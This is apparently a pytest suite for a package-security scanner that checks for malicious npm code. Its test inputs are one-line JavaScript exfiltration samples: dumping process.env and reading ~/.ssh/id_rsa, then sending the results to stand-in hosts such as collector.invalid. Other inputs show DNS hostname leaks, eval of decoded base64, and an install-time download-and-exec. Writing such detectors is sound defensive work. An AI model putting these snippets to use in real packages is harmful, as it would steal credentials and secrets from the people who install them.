from pathlib import Path

from pkgguard_analyzer.code_scan.files import CodeFile
from pkgguard_analyzer.code_scan.js_facts import extract_facts
from pkgguard_analyzer.code_scan.patterns import scan_patterns
from pkgguard_analyzer.code_scan.rules import FindingCollector, add_file_findings
from pkgguard_analyzer.schema import Severity


def findings_for(code: str, install_time: bool = False):
    data = code.encode()
    code_file = CodeFile("index.js", Path("index.js"), len(data), True, install_time, not install_time)
    collector = FindingCollector()
    add_file_findings(code_file, extract_facts(data), scan_patterns(data), collector)
    return {f.rule_id: f for f in collector.findings()}


def test_env_dump_plus_network_is_exfiltration():
    found = findings_for('const https = require("https"); https.request({host: "collector.invalid"}).end(JSON.stringify(process.env));')
    assert found["code.exfiltration"].severity == Severity.HIGH


def test_ssh_key_plus_fetch_during_install_is_high_confidence():
    found = findings_for('const k = fs.readFileSync(home + "/.ssh/id_rsa"); fetch("https://collector.invalid", {method: "POST", body: k});', install_time=True)
    assert found["code.exfiltration"].confidence == "HIGH"
    assert found["code.sensitive_path"].severity == Severity.HIGH


def test_hostname_plus_network_is_low_confidence_exfiltration():
    found = findings_for('const os = require("os"); const dns = require("dns"); dns.lookup(os.hostname() + ".x.invalid", () => {});')
    assert found["code.exfiltration"].confidence == "LOW"


def test_decode_and_run():
    found = findings_for('eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());')
    assert found["code.decode_and_run"].severity == Severity.HIGH


def test_install_time_download_and_exec():
    found = findings_for('const { execSync } = require("child_process"); const https = require("https"); https.get(u, () => execSync("./bin"));', install_time=True)
    assert "code.install_download_exec" in found
    assert "code.install_network" not in found


def test_install_time_network_only():
    found = findings_for('require("https").get("https://example.invalid/binary");', install_time=True)
    assert "code.install_network" in found


def test_raw_public_ip_but_not_localhost():
    assert "code.raw_ip" in findings_for('fetch("http://45.33.32.156/payload")')
    assert "code.raw_ip" not in findings_for('fetch("http://127.0.0.1:3000/health")')


def test_hex_escapes_and_encoded_blob():
    hex_string = "\\x68" * 25
    assert "code.hex_escapes" in findings_for(f'const s = "{hex_string}";')
    import base64, os
    blob = base64.b64encode(os.urandom(300)).decode()
    assert "code.encoded_blob" in findings_for(f'const payload = "{blob}";')
    assert "code.encoded_blob" not in findings_for(f'const img = "data:image/png;base64,{blob}";')


def test_repeated_hits_are_merged():
    found = findings_for("eval(a); eval(b); eval(c);")
    assert found["code.dynamic_code"].occurrences == 3


def test_plain_library_code_has_no_findings():
    assert findings_for('const path = require("path"); module.exports = (a, b) => path.join(a, b);') == {}
